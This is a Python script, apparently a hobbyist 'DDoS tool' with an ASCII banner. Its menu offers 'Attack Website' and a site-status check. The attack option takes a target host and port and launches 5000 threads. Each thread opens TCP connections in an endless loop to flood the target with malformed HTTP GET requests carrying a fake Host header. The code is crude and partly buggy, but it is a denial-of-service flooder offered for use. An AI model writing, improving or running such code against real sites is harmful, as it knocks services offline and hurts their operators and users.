import threading
import socket
import time
import urllib.request
from urllib.error import HTTPError

print("""

    ___                      ______      __    
   /   |  ____  ____  ____  / ________ _/ /    
  / /| | / __ \/ __ \/ __ \/ /   / __ `/ /     
 / ___ |/ / / / /_/ / / / / /___/ /_/ / /      
/_/  |_/_/ /_/\____/_/ /_/\____/\__,_/_/                                                      
       __    __              __              __
  ____/ ____/ ____  _____   / /_____  ____  / /
 / __  / __  / __ \/ ___/  / __/ __ \/ __ \/ / 
/ /_/ / /_/ / /_/ (__  )  / /_/ /_/ / /_/ / /  
\__,_/\__,_/\____/____/   \__/\____/\____/_/   
""")
print("""          Lightweight v1

""")

def main():
    print("""
    [1] Attack Website
    [2] Check Website Status
    [3] Exit
    """)

    def ddos():
        target = input('target: ')
        port = int(input('port: '))
        print("Attacking " + target + " in port " "%s" % (port))
        fake_ip = '182.21.20.32'

        time.sleep(3)
        print("attack started")
        already_connected = 0

        def attack():
            while 1 > 0:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

                global already_connected
                already_connected += 1
                packetssent = str(already_connected)

                print("packets sent: " + packetssent)


        for i in range(5000):
            thread = threading.Thread(target=attack)
            thread.start()

    def ping():
        site = input("Check site status: ")
        print("Checking Status: " + site)
        time.sleep(1)

        try:
            print(urllib.request.urlopen("http://" + site).getcode())
        except urllib.error.HTTPError as err:
            print(err.code)
        except:
            print("error")

        main()

    action = input(": ")
    if action == "1":
        ddos()
    elif action == "2":
        ping()
    elif action == "3":
        exit()
    else:
        print("Invalid")
        time.sleep(1)
        main()

main()